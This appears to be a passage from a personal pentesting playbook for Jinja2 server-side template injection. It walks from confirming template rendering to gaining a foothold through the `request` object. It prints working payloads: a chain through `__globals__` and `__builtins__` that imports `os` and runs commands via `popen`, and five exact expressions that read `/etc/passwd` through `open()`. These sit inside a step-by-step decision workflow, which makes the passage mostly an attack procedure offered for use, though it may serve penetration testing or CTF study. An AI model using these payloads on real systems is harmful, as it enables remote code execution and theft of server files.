...
Land here because `{{request}}` rendered object/value.

Goal: gain the first useful primitive from `request` access, record the exact working chain, then route to [[Jinja2 SSTI - Post-Primitive Workflow]].
...
- Output (e.g. `uid=...`) → **RCE** confirmed → record working command information and go to [[Jinja2 SSTI - Post-Primitive Workflow]] 
  ...
  ii. Exact working prefix/chain: `request.application.__globals__['__builtins__']['__import__']('os').` 
  iii. Pattern that worked: `popen('id').read()`
- Empty / blocked / error → record exact response → go to 2
## 2. Subclasses RCE (warning loop/trick)
...
- No output / error → record exact response → go to 3

## 3. File read (fallback when direct RCE paths fail)

Goal: recover `open()` (or any file-like callable) from Python internals and read `/etc/passwd` (or other files of interest).

### 3.1 Function globals → open

**Test these EXACT functions in order:**

1. `{{request.application.__globals__['__builtins__']['open']('/etc/passwd').read()}}`
2. `{{request.__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}`
3. `{{request.environ.__class__.__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}`
4. `{{request.url.__class__.__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}`
5. `{{request.base_url.__class__.__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}`
> [!note] Replace the absolute file path, in this example `/etc/passwd`, with other absolute file paths you may wish to try and read.

- Output looks like genuine file contents → SUCCESS 
  i. Primitive type: `file-read` 
  ii. Exact working prefix/chain: `request.application.__globals__['__builtins__']['open']` (or whichever of the above functions 1–5 actually worked) 
...
- Empty / blocked / error → record exact response → go to 3.2
...
> [!note] You are not necessarily looking for the Class Search Terms to be the exact class names, as some class names can be class chains. For example, searching for `FileWrapper` may return `werkzeug.wsgi.FileWrapper` which is a class name you will want to include in the next step.
...
iii. Pattern that worked: `DIRECT PATH|STREAM ACCESS|etc.` → [[Jinja2 SSTI - Post-Primitive Workflow#**4. File operations (only if primitive = file-read)** Use the exact file-read chain you recorded (with your working INDEX).]]
